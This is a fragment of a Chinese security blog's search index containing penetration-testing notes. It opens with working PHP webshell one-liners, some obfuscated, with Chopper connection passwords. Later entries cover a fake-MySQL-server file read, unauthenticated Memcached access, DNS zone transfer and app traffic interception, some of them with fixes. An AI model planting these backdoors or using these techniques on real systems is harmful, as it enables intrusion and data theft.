$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)
#执行命令和上传文件参考assert函数(不需要加分号)。
#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。
preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数
#cmd=system(whoami)
#菜刀连接密码：cmd
call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数
#cmd=system(whoami)
#菜刀连接密码：cmd
$cmd=$_POST[&apos;cmd&apos;];
$array[0]=$cmd;
call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)
#命令执行func=system&amp;cmd=whoami
#菜刀连接http://localhost/123.php?func=assert  密码cmd
$cmd=$_POST[&apos;cmd&apos;];
$array1=array($cmd);
$func =$_GET[&apos;func&apos;];
array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用
#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);
#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd
usort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>使用drony解决APP无法抓包</title>
    <url>/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>默认Flutter不会主动使用系统代理，需要单独设置。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。</p>
<h2 id="环境常规配置："><a href="#环境常规配置：" class="headerlink" title="环境常规配置："></a>环境常规配置：</h2><h3 id="1-抓包工具安装，证书安装；"><a href="#1-抓包工具安装，证书安装；" class="headerlink" title="1.抓包工具安装，证书安装；"></a>1.抓包工具安装，证书安装；</h3><h3 id="2-安卓模拟器安装，并安装drony"><a href="#2-安卓模拟器安装，并安装drony" class="headerlink" title="2.安卓模拟器安装，并安装drony"></a>2.安卓模拟器安装，并安装drony</h3><h3 id="3-drony配置-这里试验抓闲鱼的数据包"><a href="#3-drony配置-这里试验抓闲鱼的数据包" class="headerlink" title="3.drony配置(这里试验抓闲鱼的数据包):"></a>3.drony配置(这里试验抓闲鱼的数据包):</h3><p>进入drony,此时是off关闭状态，</p>
<p><img src="0.png" alt="0"></p>
<p>向左划动，选择Wi-Fi</p>
<p><img src="1.png" alt="1"></p>
<p>对wi-fi进行设置</p>
<p><img src="2.png" alt="2"></p>
<p>选择代理模式为手动（Manual）</p>
<p><img src="3.png" alt="3"></p>
<p>Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all</p>
<p><img src="4.png" alt="4"></p>
<p>选择Rule，设置应用规则</p>
<p><img src="5.png" alt="5">)<img src="6.png" alt="6"></p>
<p>Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain，</p>
<p>Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。</p>
<p><img src="7.png" alt="7"></p>
<p>返回到主页面，点击off，变为启动状态</p>
<p><img src="8.png" alt="8"></p>
<h3 id="4-抓包工具配置："><a href="#4-抓包工具配置：" class="headerlink" title="4.抓包工具配置："></a>4.抓包工具配置：</h3><p>设置代理ip及端口</p>
<p><img src="8-2.png" alt="8-2"></p>
<p>后续进行抓包常规操作即可</p>
<p><img src="9.png" alt="9"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>测试姿势</tag>
      </tags>
  </entry>
  <entry>
    <title>伪造mysql服务端实现任意文件读取</title>
    <url>/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
    <content><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p>
<h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql

2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）

3.。。。。。其他情况</code></pre><hr>
<h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p>
<h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取

启动

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>

读取的文件最后保存在log文件夹下</code></pre><hr>
<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p>
<p>exp_input.py 3306</p>
<p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p>
<p><img src="0.png" alt="0"></p>
<p>靶机使用mysql向攻击端发送请求</p>
<p><img src="0-1.png" alt="0-1"></p>
<p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p>
<p><img src="1.png" alt="1"></p>
<p>此时返回攻击端，可以看到dos窗口回显了信息</p>
<p><img src="0-0.png" alt="0-0"></p>
<p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p>
<p><img src="0-2.png" alt="0-2"></p>
<p><img src="0-3.png" alt="0-3"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>MemCache未授权访问漏洞</title>
    <url>/2018/03/18/memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Memcached 分布式缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。默认的 11211 端口不需要密码即可访问，直接访问即可获取数据库中所有信息，造成严重的信息泄露。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">stats  //查看memcache 服务状态</span><br><span class="line">stats items  //查看所有items</span><br><span class="line">stats cachedump <span class="number">32</span> <span class="number">0</span>  //获得缓存key</span><br><span class="line">get :state:<span class="number">264861539228401373</span>:<span class="number">261588</span>   //通过key读取相应value，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">telnet <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">11211</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">11211</span>...</span><br><span class="line">Connection established.</span><br><span class="line">Escape character is '^@]'.</span><br><span class="line">stats   //查看memcache 服务状态</span><br><span class="line">STAT pid <span class="number">2233</span></span><br><span class="line">STAT uptime <span class="number">20494233</span></span><br><span class="line">STAT <span class="built_in">time</span> <span class="number">1513170633</span></span><br><span class="line">STAT version <span class="number">1</span>.<span class="number">2</span>.<span class="number">6</span></span><br><span class="line">STAT pointer_size <span class="number">32</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>1、配置memcached监听本地回环地址127.0.0.1。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[root@local ~]</span><span class="comment"># vim /etc/sysconfig/memcached</span></span><br><span class="line"><span class="attr">OPTIONS</span>=<span class="string">"-l 127.0.0.1"</span>  <span class="comment">#设置本地为监听</span></span><br><span class="line"></span><br><span class="line"><span class="section">[root@local ~]</span><span class="comment"># /etc/init.d/memcached restart #重启服务</span></span><br></pre></td></tr></table></figure>

<p>​    2、当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>域传送漏洞</title>
    <url>/2016/08/03/%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。<br>通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
<li>获取网络拓扑，服务器集中ip地址段</li>
<li>数据库ip</li>
<li>其他敏感服务器ip</li>
<li>暴露大量子域</li>
</ol>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>输入nslookup命令进入交互式shell;<br> server 命令参数设定查询将要使用的DNS服务器;<br> ls命令列出某个域中的所有域名;<br> exit命令退出 </p>
<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; nslookup</span><br><span class="line">默认服务器:  public1.<span class="number">114</span>dns.com</span><br><span class="line"><span class="function">Address:  114.114.114.114</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&gt; <span class="title">server</span> <span class="title">dns.xxx.xxx.cn</span></span></span><br><span class="line"><span class="function">默认服务器:  <span class="title">xxx.xxx.xxx.cn</span></span></span><br><span class="line"><span class="function"><span class="title">Address</span>:  <span class="title">xxx.xxx.xxx.xxx</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&gt; <span class="title">ls</span> <span class="title">xxx.xxx.cn</span></span></span><br><span class="line"><span class="function">[<span class="title">xxx.xxx.xxx.cn</span>]</span></span><br><span class="line"><span class="function"> <span class="title">xxx.xxx.cn</span>.                   <span class="title">NS</span>     <span class="title">server</span> = <span class="title">dns.xxx.xxx.cn</span></span></span><br><span class="line"><span class="function"> <span class="title">xxx.xxx.cn</span>.                   <span class="title">A</span>      127.0.0.1</span></span><br><span class="line"><span class="function"> <span class="title">xxx</span>                            <span class="title">A</span>      192.168.1.2</span></span><br><span class="line"><span class="function"> ......</span></span><br></pre></td></tr></table></figure>



<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.xxx.cn -p <span class="number">53</span> -Pn dns.xxx.xxx.cn</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>严格限制允许区域传送的主机，例如一个主DNS服务器应该只允许它的从DNS服务器执行区域传送的功能。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
</search>
